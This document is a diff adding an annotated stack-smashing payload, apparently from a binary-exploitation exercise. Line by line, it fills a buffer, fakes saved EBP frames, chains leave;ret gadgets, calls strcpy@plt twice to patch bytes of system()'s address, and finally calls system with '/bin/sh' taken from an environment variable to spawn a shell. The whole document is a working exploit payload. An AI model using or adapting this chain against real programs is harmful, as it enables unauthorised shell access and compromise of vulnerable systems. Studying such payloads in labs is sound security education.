@@ -1,0 +1,31 @@
+61616161	First four lines of 61's are to fill up buf
+61616161
+61616161
+61616161
+62626262	The two lines of 62's are junk
+62626262
+d8f3ffbf	fake ebp0
+7a840408	address of leaveret
+62626262	The two lines of 62's are junk
+62626262
+f4f3ffbf	(fake ebp0 points here) fake ebp1
+40830408	address of strcpy@plt
+7a840408	address of leaveret
+14f4ffbf	strcpy arg1 -> address of the right byte of system's address
+48830408	strcpy arg2 -> address of the null byte
+62626262	The two lines of 62's are junk
+62626262
+10f4ffbf	(fake ebp1 points here) fake ebp2
+40830408	address of strcpy@plt
+7a840408	address of leaveret
+17f4ffbf	strcpy arg1 -> address of the left byte of system's address
+48830408	strcpy arg2 -> address of the null byte
+62626262	The two lines of 62's are junk
+62626262
+41414141	(fake ebp2 points here) fake ebp3
+61711761	address of system function
+61616161	return address of system function
+25f7ffbf	system arg1 -> address of the "/bin/sh", which is kept inside an environment variable  
+
+
+
